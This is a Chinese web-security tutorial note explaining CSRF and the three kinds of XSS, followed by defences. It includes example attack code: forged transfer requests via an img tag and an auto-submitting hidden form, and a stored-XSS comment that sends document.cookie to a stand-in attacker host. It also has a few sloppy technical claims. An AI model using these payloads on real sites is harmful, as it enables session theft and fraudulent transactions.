# CSRF 和 XSS

## CSRF

Cross site request forgery，跨站请求欺骗，利用的是对于浏览器的信任。

一般情况的**被攻击流程**：

* 首先用户C浏览并登录了受信任站点A；
* 登录信息验证通过以后，站点A会在返回给浏览器的信息中带上已登录的cookie，cookie信息会在浏览器端保存一定时间（根据服务端设置而定）；
* 完成这一步以后，用户在没有登出（清除站点A的cookie）站点A的情况下，访问恶意站点B；
* 这时恶意站点 B的某个页面向站点A发起请求，而这个请求会带上浏览器端所保存的站点A的cookie；
* 站点A根据请求所带的cookie，判断此请求为用户C所发送的。

这样一来站点 A 会按照用户 C 的权限受理刚刚收到的请求，可能为发送邮件，短信，甚至转账等等。



### Get请求的攻击

例如某银行按照 Get 请求发起转账，转账的地址为www.xxx.com/transfer.do?accountNum=l000l&money=10000，表示给 account 为10001的账户转账10000元。

在某个网站中，可能有一个图片，其链接为

```html
<img src ='www.xxx.com/transfer.do?accountNum=l000l&money=10000'>
```

那么在进入页面的时候就会自动加载，并且因为用户没有登出银行网站，于是这一条请求就被执行了。而且使用的是用户的 cookie(权限)



### Post 请求的攻击

大多数的网站不会使用 Post 来进行数据更新，于是就有了新的方法

```html
<form id="aaa" action="http://www.xxx.com/transfer.do" metdod="POST" display="none">
    <input type="text" name="accountNum" value="10001"/>
    <input type="text" name="money" value="10000"/>
</form>
<script>
    var form = document.forms('aaa');
    form.submit();
</script>
```

可以看到在上面这个部分种，有一个隐藏的表单，在用户加载的时候自执行提交，于是就变成了 Post 请求。如果参数如此简单，那么就会被攻击。



### CSRF防御

1. 尽量使用 Post 而不是 Get
2. 将 cookie 属性设置为 Httponly，这样通过程序(js 脚本或者 applet)就无法读到 cookie，也就避免了伪造 cookie 的行为
3. 使用额外参数 token，每次会话服务器会产生一个随机 token，在受信任网站 A 中某处存放(不在 cookie)，提交的时候会连带 token 一起提交，因此其他网站无法伪造这个 token
4. 通过 http 头的Referer字段辨认，当用户在本页面发起请求的时候，refer 值是http://www.xxx.com(对于本例)，但是如果在外源网站发起申请 referer 就会是外源网址。

```javascript
String referer = request.getHeader("Referer"); // 获取 Referer 值
```

## XSS攻击

Cross Site Scripting 跨站脚本，利用的是对用户的信任。分为三类，**反射型**，**存储型**，**Dom-based**

其中`反射型和 dom-based 为非持久性攻击，存储型为持久性攻击`。



### 反射型(恶意链接)

主要方式为用户点在恶意网站击某个链接的时候，脚本通过一些方式窃取用户信息然后返回到网站服务端。

例如某网站为：

```html
<body>
  <div>
    <a href="http://localhost:3001/xss">xxs 攻击</a>
    <a href="http://localhost:3001/testcookie">testcookie 攻击</a>
  </div>
</body>
```

后端为：

```javascript
router.get('/xss', (ctx, next) => {
  ctx.body = '<script>alert("反射型 XSS 攻击")</script>';
});

router.get('/testcookie', (ctx, next) => {
  console.log(ctx.cookies.get('connect.sid'));
  ctx.body = '<script>alert("'+ctx.cookies.get('connect.sid')+'")</script>';
  next();
});
```

用户如果点击了这两个链接，对应的内容就会被执行，用户的 cookie 就会被获取。

### 存储型

存储型一般利用的是把恶意代码插入数据库中。

例如一个论坛网站，有一个地方可以发表评论，在这个地方，恶意用户写一段代码作为评论，然后作为评论插入了数据库中，例如：

```javascript
<script>window.open("www.gongji.com?param="+document.cookie)</script>
```

这条评论如果不加任何处理加入数据库中，那么下次浏览这条评论的人的浏览器就会执行上面这段代码。

上面这段代码会产生一个 get 请求，www.gongji.com?param= 用户的 cookie，这样在恶意网站的后台，就可以看到用户的访问记录，从而拿到用户的 cookie。



### Dom-based

Dom-based 攻击方法主要基于一个事情，就是早期时候利用 js 或者 jquery 对于 html 和用户输入的拼接。例如：

```javascript
document.getElementbyId('id').innerHtml = '自定义部分' +用户输入 +'自定义部分'
```

如果有一段代码值为：javascript:alert('dom-xss')， 或者插入一段代码破坏代码结构的转义，或者输入一段代码进行标签闭合，就会破坏 html 结构。

因为使用 innerHtml 会直接解析恶意代码，导致恶意代码执行。



## Xss 防御

1. 永远不要相信用户输入，对用户输入进行过滤。
2. 对于要拼接的部分，对于潜在威胁的部分，进行编码，例如< 转成 &lt. > 转成 &gt. 这个样子。 
3. cookie 设置 httponly，这样在 document 中无法看到 cookie







参考链接：1. [安全|常见的Web攻击手段之CSRF攻击](https://www.jianshu.com/p/67408d73c66d)

2. [Web 安全之Xss 攻击原理及防范](https://www.cnblogs.com/tugenhua0707/p/10909284.html)

